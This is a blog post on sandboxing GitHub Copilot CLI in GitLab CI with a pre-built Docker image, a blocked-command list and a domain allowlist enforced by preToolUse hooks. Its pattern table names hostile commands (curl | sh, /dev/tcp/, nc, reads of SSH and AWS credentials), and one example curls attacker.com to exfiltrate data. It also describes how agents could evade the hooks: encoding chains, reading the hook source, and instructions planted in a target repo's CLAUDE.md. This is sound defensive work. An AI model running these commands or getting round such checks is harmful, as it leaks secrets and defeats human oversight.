---
layout: page
title: "Building a Secure Docker Container for AI-Powered CI/CD Pipelines"
permalink: /agentic-container-configuration/
---

# Building a Secure Docker Container for AI-Powered CI/CD Pipelines

An LLM with shell access can `rm -rf /`, exfiltrate secrets, or install arbitrary packages. I built a shared Docker container that gives GitHub Copilot CLI everything it needs to generate documentation in GitLab CI, while locking down what it's allowed to do.

## The Problem

I have two GitLab pipelines that use GitHub Copilot CLI to generate documentation:

1. `generate-docs-from-git-history` produces Architecture Decision Records (ADRs) from commit history
2. `generate-onboarding-docs` creates onboarding documentation for new developers

Both pipelines need the same set of tools: Node.js, Git, Python, `jq`, the GitHub CLI, Copilot CLI, and Mermaid CLI (for rendering diagrams). Installing all of these on every pipeline run wastes minutes. A shared container image comes pre-loaded with everything.

Copilot CLI has `--allow-all-tools`, meaning it can execute arbitrary shell commands. In a CI environment running with elevated permissions and access to `CI_JOB_TOKEN`, that's a real attack surface. The container needs to ship with guardrails baked in.

## The Container: `ai-tools-container`

The container lives at `pipelines/ai-tools-container/` and consists of three parts:

```
pipelines/ai-tools-container/
├── Dockerfile
├── build-image.gitlab-ci.yml
└── hooks/
    ├── security-hooks.json
    ├── security-check.sh
    └── security-check.ps1
```

### The Dockerfile

The image is based on `node:22` and layers on everything the pipelines need:

```dockerfile
FROM node:22

# System dependencies
RUN apt-get update && apt-get install -y --no-install-recommends \
    git \
    ca-certificates \
    python3 \
    python-is-python3 \
    gettext-base \
    jq \
    # Chromium/Puppeteer dependencies for Mermaid diagram rendering
    libnss3 \
    libatk1.0-0 \
    libatk-bridge2.0-0 \
    libcups2 \
    libdrm2 \
    libxkbcommon0 \
    libxcomposite1 \
    libxdamage1 \
    libxfixes3 \
    libxrandr2 \
    libgbm1 \
    libasound2 \
    libpango-1.0-0 \
    libcairo2 \
    fonts-liberation \
    && rm -rf /var/lib/apt/lists/*
```

`gettext-base` provides `envsubst`, used to template prompts at runtime. Pipeline variables like `$MR_INFO` and `$SOURCE_PROJECT_URL` get injected into a prompt template before being handed to Copilot. The Chromium dependencies (`libnss3`, `libatk1.0-0`, etc.) are there so Mermaid CLI can render diagrams to SVG/PNG; Puppeteer needs these shared libraries in a headless container or it crashes on launch. `fonts-liberation` ensures rendered diagrams have readable text rather than missing-glyph boxes.

Next, the GitHub CLI is installed from GitHub's official apt repository:

```dockerfile
RUN curl -fsSL https://cli.github.com/packages/githubcli-archive-keyring.gpg \
    | dd of=/usr/share/keyrings/githubcli-archive-keyring.gpg \
    && chmod go+r /usr/share/keyrings/githubcli-archive-keyring.gpg \
    && echo "deb [arch=$(dpkg --print-architecture) \
      signed-by=/usr/share/keyrings/githubcli-archive-keyring.gpg] \
      https://cli.github.com/packages stable main" \
      | tee /etc/apt/sources.list.d/github-cli.list > /dev/null \
    && apt-get update \
    && apt-get install -y gh \
    && rm -rf /var/lib/apt/lists/*
```

`gh` is required because Copilot CLI uses it for authentication. The pipeline authenticates with `echo "$TOKEN" | gh auth login --with-token` before invoking Copilot.

Finally, the two global npm packages:

```dockerfile
RUN npm install -g @github/copilot @mermaid-js/mermaid-cli
```

And a verification step that acts as a build-time smoke test:

```dockerfile
RUN node --version && npm --version && git --version && \
    python3 --version && jq --version && gh --version && \
    copilot --version && mmdc --version
```

If any tool fails to install, the image build fails. No silent breakage.

### Baking in Security Hooks

The last two lines of the Dockerfile are the most important:

```dockerfile
COPY hooks/ .github/hooks/
COPY hooks/ .claude/hooks/
```

This copies the security hooks into both `.github/hooks/` (where Copilot CLI looks) and `.claude/hooks/` (for Claude Code compatibility) inside the image. The hooks are baked into the container at build time, not copied at runtime. Even if the AI agent modifies the working directory's hook configuration, the originals are present in the image filesystem.

## The Security Hook System

The hook is configured via `security-hooks.json`:

```json
{
  "version": 1,
  "hooks": {
    "preToolUse": [
      {
        "type": "command",
        "bash": "./.github/hooks/security-check.sh",
        "powershell": "./.github/hooks/security-check.ps1",
        "cwd": ".",
        "timeoutSec": 15
      }
    ]
  }
}
```

Every time Copilot CLI is about to use a tool (run a shell command, write a file, etc.), this hook fires first. It receives the tool name and arguments as JSON on stdin and must respond with either `{"approve": true}` or `{"approve": false, "message": "reason"}`.

### How `security-check.sh` Works

The script implements two checks: a command blocklist and a domain allowlist.

#### Check 1: Blocked Command Patterns

The script defines ~100 regex patterns covering dangerous operations. These are combined into a single regex at startup for O(1) matching:

```bash
COMBINED_PATTERN=$(IFS='|'; echo "${BLOCKED_COMMAND_PATTERNS[*]}")
```

Then each command is checked with a single `grep -E`:

```bash
check_blocked_commands() {
    local command="$1"
    if echo "$command" | grep -qE "$COMBINED_PATTERN" 2>/dev/null; then
        # Match found: identify which pattern for the error message
        for pattern in "${BLOCKED_COMMAND_PATTERNS[@]}"; do
            if echo "$command" | grep -qE "$pattern" 2>/dev/null; then
                echo "$pattern"
                return 0
            fi
        done
    fi
    return 1
}
```

The fast path is a single combined regex. The slow path (iterating individual patterns) only runs on a match, to produce a useful error message. This keeps per-check latency under 100ms.

The blocked patterns fall into several categories:

| Category | Examples |
|----------|----------|
| Destructive ops | `rm -rf`, `mkfs`, `dd of=/dev/`, `shred` |
| Encoding bypasses | `base64 -d \| bash`, `eval`, `source` |
| Indirect execution | `bash script.sh`, `python -c`, `find -exec`, `xargs sh` |
| Environment manipulation | `export PATH=`, `export LD_PRELOAD=` |
| Network tricks | `/dev/tcp/`, `nc`, `socat`, `telnet` |
| Sensitive file access | `.ssh/id_*`, `.aws/credentials`, `.env`, `.git-credentials` |
| Credential leakage | `echo $AWS_SECRET_KEY`, `curl -u`, `printenv` |
| Package installation | `npm install`, `pip install`, `apt install`, `cargo add` |
| Remote code execution | `curl \| sh`, `wget \| sudo` |
| Self-protection | Any access to the hooks directory or scripts themselves |

Package manager blocking matters because without it, the LLM could install arbitrary packages to gain capabilities the container wasn't designed to provide: a backdoor shell tool, a network scanner.

The self-protection category prevents the AI from reading or modifying the hook scripts. If the agent could `cat security-check.sh`, it could study the patterns and craft commands that evade them.

#### Check 2: Domain Allowlist

Any command containing a URL is checked against an allowlist:

```bash
ALLOWED_DOMAINS=(
    "gitlab.com"
    "github.com"
)

is_domain_allowed() {
    local domain="$1"
    for allowed in "${ALLOWED_DOMAINS[@]}"; do
        if [[ "$domain" == "$allowed" ]] || \
           [[ "$domain" == *".$allowed" ]]; then
            return 0
        fi
    done
    return 1
}
```

This prevents data exfiltration. The agent can `curl https://api.github.com/...` (needed for its work) but cannot `curl https://attacker.com/collect?data=...`. The subdomain matching (`*.$allowed`) ensures `api.github.com` passes while still blocking unrelated domains.

## The Build Pipeline

The container is built by a dedicated GitLab CI job:

```yaml
build-ai-tools-image:
  stage: build-image
  image: docker:24
  services:
    - docker:24-dind
  variables:
    DOCKER_TLS_CERTDIR: "/certs"
    IMAGE_NAME: "${CI_REGISTRY_IMAGE}/ai-tools-container"
    IMAGE_TAG: "latest"
  rules:
    - if: '$CI_PIPELINE_SOURCE == "web"'
      when: manual
    - changes:
        - pipelines/ai-tools-container/Dockerfile
      when: manual
  before_script:
    - docker login -u "$CI_REGISTRY_USER" -p "$CI_REGISTRY_PASSWORD" "$CI_REGISTRY"
  script:
    - |
      cd pipelines/ai-tools-container
      docker build -t "${IMAGE_NAME}:${IMAGE_TAG}" .
      docker push "${IMAGE_NAME}:${IMAGE_TAG}"
```

Two trigger conditions, both manual: clicking "Run pipeline" in the GitLab UI, or modifying the Dockerfile in a commit (the job appears but still requires manual approval).

The `when: manual` gate is deliberate. A bad image pushed automatically could break both downstream pipelines simultaneously.

The image is pushed to GitLab's built-in container registry at `registry.gitlab.com/.../ai-tools-container:latest`. Downstream pipelines reference it directly:

```yaml
image: registry.gitlab.com/naturalhistorymuseum/digital-development/experiments/ai-tooling/ai-tools-container:latest
```

## How Downstream Pipelines Use It

Both documentation pipelines follow the same pattern:

1. Start from the pre-built image (all tools already installed)
2. Clone the ai-tooling repo via sparse checkout to get the latest skills and scripts
3. Run `setup-environment.sh`, which clones the target repository, copies skills, and re-copies the security hooks into the working directory
4. Template the prompt using `envsubst` to inject pipeline variables
5. Authenticate `gh` and run `copilot` with `--allow-all-tools --deny-tool 'shell(rm)'`
6. Collect artifacts and optionally create a merge request

The setup script re-copies hooks at runtime too:

```bash
cp -r "${AI_TOOLING_DIR}/pipelines/ai-tools-container/hooks" .github/
chmod +x .github/hooks/security-check.sh
```

This serves as belt-and-suspenders. The hooks exist in the image at build time, but the working directory changes to the cloned target repo. Copying them again ensures they're present wherever `copilot` runs.

## Defence in Depth

The security model has multiple layers:

1. Container: only pre-approved tools are installed. Package managers are blocked by the hook at runtime.
2. Hooks: every tool invocation passes through the security check. Dangerous commands are blocked before execution.
3. Copilot: `--deny-tool 'shell(rm)'` adds a Copilot-native block on `rm`.
4. Network: domain allowlisting prevents data exfiltration.
5. Self-protection: the hooks block access to their own source code.
6. Pipeline: manual triggers prevent accidental image rebuilds. Timeouts (`COPILOT_TIMEOUT: "2700"`) prevent runaway agents.

## Known Limitations

What this doesn't catch:

- A creative enough encoding chain could bypass regex matching
- A symlink could theoretically change between check and execution (low risk in practice)
- A malicious `CLAUDE.md` in a target repo could instruct the agent to work around the hooks
- The hooks check commands, not the content of files being written

The hooks prevent accidents and opportunistic attacks, not a determined adversary with shell access.

## If you're running AI agents in CI/CD

Pre-build your container with exactly the tools needed. Don't let the agent install anything at runtime. Use `preToolUse` hooks to intercept every command before execution.

Block package managers. An agent that can `npm install` anything can do anything. Allowlist network access rather than blocklisting; you can't enumerate every malicious domain, but you can enumerate the ones the agent legitimately needs.

Make the hooks self-protecting. If the agent can read the hook source, it can learn to evade it. And layer your defences: combine container constraints, hook-level checks, tool-level deny lists, and pipeline-level controls.

The full implementation is in the [`ai-tooling`](https://gitlab.com/naturalhistorymuseum/digital-development/experiments/ai-tooling) repository under `pipelines/ai-tools-container/`.
